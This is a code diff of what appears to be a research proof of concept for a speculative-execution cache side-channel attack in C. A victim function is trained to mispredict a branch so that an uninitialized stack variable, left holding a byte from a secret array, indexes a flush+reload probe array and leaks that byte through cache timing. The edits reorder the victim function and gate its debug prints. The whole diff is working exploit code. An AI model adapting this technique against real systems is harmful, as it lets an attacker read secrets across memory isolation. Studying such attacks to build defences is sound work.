@@ -20,49 +20,43 @@
 #define ALIGNED_SIZE 4096
 
 cp_t* flush_reload_arr;
-volatile cp_t cp;   //cache page declared out of function to keep stack identical to init_func()
-int __attribute__((aligned(ALIGNED_SIZE))) init_cp;
-
-__attribute__((noinline)) void init_func(int val) {
-    //cp = flush_reload_arr[91];
-    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x = val;
-    printf("init  \t%p:\t%d\n", &x, x);
-}
-
-__attribute__((noinline)) void uninit_func() {
-    //cp = flush_reload_arr[01];
-    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x;
-    cp = flush_reload_arr[x];
-    printf("uninit\t%p:\t%d\n", &x, x);
-}
-
-//static inline void victim_func(char init) {
-__attribute__((noinline)) void victim_func(char init) {
-    int val = 5;
-    init_cp = init;
-
-    //flush((void*)&val);
-    flush((void*)&init_cp);
-    cpuid();
-
-    if(init_cp) {
-        init_func(val);
-    }
-    else {
-        uninit_func();
-    }
-
-}
+volatile cp_t cp;   //cache page declared out of function to keep stack of uninit_func() identical to init_func()
+int __attribute__((aligned(ALIGNED_SIZE))) init_bool_copy;
 
 void touch_secret(int secret_index) {
     volatile char __attribute__ ((aligned (ALIGNED_SIZE))) s = SECRET[secret_index];
-    printf("secret\t%p:\t%d\n", &s, s);
+    if(DBG)printf("secret\t%p:\t%d\n", &s, s);
+}
+
+void init_func(int val) {
+    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x = val;
+    if(DBG)printf("init  \t%p:\t%d\n", &x, x);
+}
+
+void uninit_func() {
+    volatile char __attribute__ ((aligned (ALIGNED_SIZE))) x;
+    cp = flush_reload_arr[x];
+    if(DBG)printf("uninit\t%p:\t%d\n", &x, x);
+}
+
+void victim_func(char init_bool, int secret_index) {
+    if(init_bool)touch_secret(secret_index);
+    for(int i = 0; i < 100; i++) {if(i%2==0) {volatile int x = 0;} else {volatile int x = 1;}}
+    init_bool_copy = init_bool;
+    int val = 5;
+
+    flush(&init_bool_copy);
+    cpuid();
+
+    if(init_bool_copy) init_func(val);
+    else               uninit_func();
+
 }
 
 int* prepare(int secret_index) {
 
     flush_reload_arr = init_flush_reload(N_PAGES);
-    flush_arr((void*)flush_reload_arr, N_PAGES);
+    flush_arr(flush_reload_arr, N_PAGES);
     cpuid();
 
     int n_accesses = N_TRAINING + 1;
@@ -71,12 +65,11 @@ int* prepare(int secret_index) {
     init_bools[n_accesses-1] = true;
 
     for(int i = 0; i < n_accesses; i++) {
-        touch_secret(secret_index);
-        victim_func(init_bools[i]);
+        victim_func(init_bools[i], secret_index);
         cpuid();
         if(i < n_accesses-1) {
             cpuid();
-            flush_arr((void*)flush_reload_arr, N_PAGES);
+            flush_arr(flush_reload_arr, N_PAGES);
         }
         cpuid();
 
